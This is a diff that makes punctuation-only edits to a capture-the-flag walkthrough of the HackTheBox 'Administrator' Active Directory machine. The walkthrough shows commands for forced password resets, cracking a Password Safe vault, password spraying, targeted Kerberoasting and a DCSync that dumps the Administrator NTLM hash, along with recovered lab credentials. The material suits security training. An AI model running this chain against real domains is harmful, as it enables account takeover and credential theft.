@@ -105,7 +105,7 @@ OLIVIA --[GenericAll / ForceChangePassword]--> MICHAEL
 MICHAEL --[ForceChangePassword]-->  BENJAMIN
 ```
 
-The chain is the intended foothold ladder — abuse `ForceChangePassword` twice to land as **Benjamin**, who has access we don't.
+The chain is the intended foothold ladder. Abuse `ForceChangePassword` twice to land as **Benjamin**, who has access we don't.
 
 ![BloodHound graph: Olivia → Michael → Benjamin](/images/administrator/Bloodhound.png)
 
@@ -140,7 +140,7 @@ Set-DomainUserPassword -Identity michael -AccountPassword $pw
 
 ## ForceChangePassword: Michael → Benjamin
 
-Repeat the exact same primitive one hop down the chain — this time as **Michael** against **Benjamin**:
+Repeat the exact same primitive one hop down the chain, this time as **Michael** against **Benjamin**:
 
 ```bash
 net rpc password 'benjamin' 'NewP@ssw0rd!2' -U 'administrator.htb/michael%NewP@ssw0rd!1' -S 10.129.x.x
@@ -156,7 +156,7 @@ nxc smb 10.129.x.x -u benjamin -p 'NewP@ssw0rd!2'
 
 ## FTP foothold as Benjamin
 
-Benjamin is permitted on the FTP service (port 21) — that's the reason the chain ends here:
+Benjamin is permitted on the FTP service (port 21), which is why the chain ends here:
 
 ```bash
 ftp 10.129.x.x
@@ -168,13 +168,13 @@ ftp> get Backup.psafe3
 ftp> bye
 ```
 
-A single artifact drops out — `Backup.psafe3`, a [Password Safe v3](https://pwsafe.org/) encrypted vault.
+A single artifact drops out: `Backup.psafe3`, a [Password Safe v3](https://pwsafe.org/) encrypted vault.
 
 ---
 
 ## Cracking the Password Safe vault
 
-Hashcat speaks Password Safe v3 natively as mode `5200`, so there's no need for the `pwsafe2john` detour — point it straight at the vault file:
+Hashcat speaks Password Safe v3 natively as mode `5200`, so there's no need for the `pwsafe2john` detour. Point it straight at the vault file:
 
 ```bash
 hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
@@ -182,7 +182,7 @@ hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
 
 ![hashcat -m 5200 against Backup.psafe3](/images/administrator/hashcat.png)
 
-rockyou cracks it almost immediately — the master passphrase is `tekieromucho`.
+rockyou cracks it almost immediately. The master passphrase is `tekieromucho`.
 
 ![hashcat cracking the vault: tekieromucho](/images/administrator/hashcat_cracked.png)
 
@@ -204,13 +204,13 @@ The vault gives three plaintext domain passwords (one per entry):
 
 ## Password spraying the vault contents
 
-The vault hands you three passwords but not which login each one belongs to — Password Safe stores them by display name, and the actual `samAccountName` mapping isn't guaranteed. Instead of guessing, drop the three accounts into `users.txt` and the three passwords into `pass.txt` and let `nxc` spray them as a matrix:
+The vault hands you three passwords but not which login each one belongs to. Password Safe stores them by display name, and the actual `samAccountName` mapping isn't guaranteed. Instead of guessing, drop the three accounts into `users.txt` and the three passwords into `pass.txt` and let `nxc` spray them as a matrix:
 
 ```bash
 nxc smb 10.129.x.x -u users.txt -p pass.txt
 ```
 
-Only one combination authenticates — `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`:
+Only one combination authenticates, `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`:
 
 ![nxc password spray matching emily to her vault password](/images/administrator/password_spray.png)
 
@@ -234,7 +234,7 @@ Re-running BloodHound with **Emily** marked as Owned exposes the next edge:
 EMILY --[GenericWrite]--> ETHAN
 ```
 
-Ethan is the interesting target because he holds **DCSync rights** (`GetChanges` + `GetChangesAll` on the domain object). `GenericWrite` on a user lets us assign an arbitrary `servicePrincipalName` — which immediately makes Ethan Kerberoastable. That's the whole idea behind **targeted Kerberoasting**: the tool writes a throwaway SPN onto the target, requests a TGS, then cleans up.
+Ethan is the target worth reaching because he holds **DCSync rights** (`GetChanges` + `GetChangesAll` on the domain object). `GenericWrite` on a user lets us assign an arbitrary `servicePrincipalName`, which immediately makes Ethan Kerberoastable. That's the whole idea behind **targeted Kerberoasting**: the tool writes a throwaway SPN onto the target, requests a TGS, then cleans up.
 
 ### Fix the clock first
 
@@ -273,13 +273,13 @@ Plaintext: `limpbizkit`.
 
 ## DCSync as Ethan
 
-Ethan's ACL gives him `GetChanges` + `GetChangesAll` on the domain object — game over. Pull the Administrator secret directly off the DC:
+Ethan's ACL gives him `GetChanges` + `GetChangesAll` on the domain object. That's game over. Pull the Administrator secret directly off the DC:
 
 ```bash
 impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.x.x
 ```
 
-The first `RemoteOperations` call falls back from the service-control path (`access_denied`) to the **DRSUAPI** replication method, which is the actual DCSync — and out comes the `Administrator` NTLM:
+The first `RemoteOperations` call falls back from the service-control path (`access_denied`) to the **DRSUAPI** replication method, which is the actual DCSync, and out comes the `Administrator` NTLM:
 
 ```text
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:3ec553c4b9fd20bd016e098d2d2fd2e:::
